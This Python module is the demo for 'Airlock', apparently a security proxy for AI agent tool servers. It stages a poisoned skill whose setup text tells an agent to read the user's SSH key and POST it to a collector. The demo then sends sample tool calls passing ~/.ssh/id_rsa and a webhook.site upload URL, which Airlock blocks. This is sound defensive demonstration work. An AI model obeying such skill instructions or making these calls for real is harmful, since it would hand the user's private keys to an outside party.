"""`airlock demo` — watch a key-theft get refused, in one command.

The whole pitch in thirty seconds, runnable straight after `pip install`: a
popular-looking skill whose own setup text tells the agent to read your SSH key
and POST it to a collector. Airlock scans the skill, holds the server the moment
its tool descriptions carry exfil indicators, and refuses every call — because of
what it touches, never because it parsed the prose.

This is the Python, cross-platform, pip-installed twin of demo.sh. It runs in a
throwaway $AIRLOCK_HOME and touches nothing of yours.
"""
from __future__ import annotations
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

from . import config

HERE = Path(__file__).resolve().parent
_SKILL = HERE / "examples" / "poisoned_skill"
_SERVER = HERE / "examples" / "poisoned_server.py"

_C = {"b": "\033[1m", "d": "\033[2m", "0": "\033[0m"}


def _beat(title: str, color: bool) -> None:
    b = _C["b"] if color else ""
    z = _C["0"] if color else ""
    print(f"\n{b}{title}{z}")


def _rpc(i, method, params) -> str:
    return json.dumps({"jsonrpc": "2.0", "id": i, "method": method,
                       "params": params})


def run(*, color: bool = True) -> int:
    home = Path(os.environ.get("AIRLOCK_HOME") or tempfile.mkdtemp(prefix="airlock-demo-"))
    env = dict(os.environ, AIRLOCK_HOME=str(home),
               AIRLOCK_POLICY=str(config.profile_path("default")),
               AIRLOCK_NOTIFY="0")
    d = _C["d"] if color else ""
    z = _C["0"] if color else ""

    _beat("1. A developer installs a skill with 12k installs.", color)
    print(f"{d}   {_SKILL.name}/SKILL.md — reads clean at a glance. Airlock scans "
          f"it first:{z}")
    from . import batch
    rep = batch.scan_path(str(_SKILL))
    print(batch.render(rep, color=color and sys.stdout.isatty()))

    _beat("2. They install it anyway. Airlock reads what the server advertises", color)
    print(f"{d}   — and holds it: the tool descriptions themselves carry the exfil "
          f"indicators.{z}")

    key_target = str(Path.home() / ".ssh" / "id_rsa")
    lines = "\n".join([
        _rpc(1, "initialize", {}),
        _rpc(2, "tools/list", {}),
        _rpc(3, "tools/call", {"name": "summarize_repo",
                               "arguments": {"path": str(Path.home())}}),
        _rpc(4, "tools/call", {"name": "init_telemetry",
                               "arguments": {"context": "boot",
                                             "key_file": key_target}}),
        _rpc(5, "tools/call", {"name": "summarize_repo",
                               "arguments": {"path": "/tmp/x",
                                             "upload": "https://webhook.site/collector"}}),
    ]) + "\n"

    _beat("3. The agent does what the skill told it to do — with your private key.", color)
    print(f"{d}   The server is held, so each call is blocked, not forwarded.{z}")
    proxy = subprocess.run(
        [sys.executable, "-m", "airlock.mcp_proxy", "--server-id",
         "repo-summarizer", "--", sys.executable, str(_SERVER)],
        input=lines, env=env, capture_output=True, text=True)

    _beat("4. What the agent received back — every call BLOCKed while held:", color)
    log = subprocess.run([sys.executable, "-m", "airlock.cli", "log", "-n", "6"],
                         env=env, capture_output=True, text=True)
    for line in log.stdout.splitlines():
        if "ADMIT" in line or "FLAG" in line:
            continue
        print(f" {line}")

    _beat("5. Every decision is in a tamper-evident log.", color)
    verify = subprocess.run([sys.executable, "-m", "airlock.cli", "verify"],
                            env=env, capture_output=True, text=True)
    for line in verify.stdout.splitlines():
        print(f"  {line}")

    print(f"\n{d}   The server was held the moment its own tool descriptions "
          f"advertised an exfil path — every call refused until a human reviews "
          f"the pin.{z}")
    print(f"{d}   Airlock never had to trust or parse the skill's prose to stop "
          f"it.{z}")
    print(f"{d}   AIRLOCK_HOME={home}{z}\n")
    # a non-zero proxy exit here would mean the demo itself broke, not a block
    return 0 if proxy.returncode == 0 else 1
